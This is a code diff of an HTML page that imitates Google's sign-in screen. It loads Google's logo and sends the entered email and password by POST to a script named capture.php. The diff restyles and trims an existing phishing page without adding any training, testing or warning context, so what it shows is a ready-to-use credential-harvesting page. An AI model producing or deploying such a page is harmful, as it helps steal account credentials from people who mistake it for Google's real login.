@@ -1,98 +1,24 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-    <style>
-        body { 
-            font-family: 'Roboto', arial, sans-serif; 
-            background-color: #fff; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            margin: 0; 
-        }
-        .login-box { 
-            border: 1px solid #dadce0; 
-            padding: 40px 40px 30px 40px; 
-            border-radius: 8px; 
-            width: 450px; 
-            text-align: center; 
-        }
-        .logo { 
-            width: 75px; 
-            margin-bottom: 10px; 
-        }
-        h2 { 
-            color: #202124; 
-            font-size: 24px; 
-            font-weight: 400; 
-            margin-bottom: 10px; 
-            margin-top: 0;
-        }
-        p { 
-            color: #202124; 
-            font-size: 16px; 
-            margin-bottom: 24px; 
-        }
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-        input { 
-            width: 100%; 
-            padding: 13px 15px; 
-            margin: 5px 0; 
-            border: 1px solid #dadce0; 
-            border-radius: 4px; 
-            box-sizing: border-box; 
-            font-size: 14px;
-        }
-        input:focus {
-            border-color: #1a73e8;
-            outline: none;
-            box-shadow: 0 0 0 1px #1a73e8;
-        }
-        .button-container {
-            display: flex;
-            justify-content: flex-end;
-            margin-top: 30px;
-        }
-        button { 
-            background-color: #1a73e8; 
-            color: white; 
-            border: none; 
-            padding: 10px 24px; 
-            border-radius: 4px; 
-            cursor: pointer; 
-            font-size: 14px; 
-            font-weight: 500; 
-        }
-        button:hover { 
-            background-color: #1557b0; 
-        }
-    </style>
+  <style>
+    body { font-family: 'Roboto', arial, sans-serif; background-color: #f0f2f1; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+    .login-box { background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.21); width: 360px; text-align: center; }
+    img { width: 75px; margin-bottom: 10px; }
+    h2 { font-weight: 400; margin-bottom: 20px; }
+    input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
+    button { width: 100%; padding: 10px; background-color: #1a73e8; color: white; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; }
+  </style>
 </head>
 <body>
-    <div class="login-box">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png" alt="Google" class="logo">
-        <h2>Sign in</h2>
-        <p>Use
-
-your Google Account</h2>
-        <form action="capture.php" method="POST">
-            <div class="input-group">
-                <input type="text" name="username" placeholder="Email or phone" required>
-            </div>
-            <div class="input-group">
-                <input type="password" name="password" placeholder="Enter your password" required>
-            </div>
-            <div class="button-container">
-                <button type="submit">Next</button>
-            </div>
-        </form>
-    </div>
+  <div class="login-box">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272dp.png" alt="Google">
+    <h2>Sign in</h2>
+    <form action="capture.php" method="POST">
+      <input type="text" name="username" placeholder="Email or phone" required>
+      <input type="password" name="password" placeholder="Enter your password" required>
+      <button type="submit">Next</button>
+    </form>
+  </div>
 </body>
 </html>
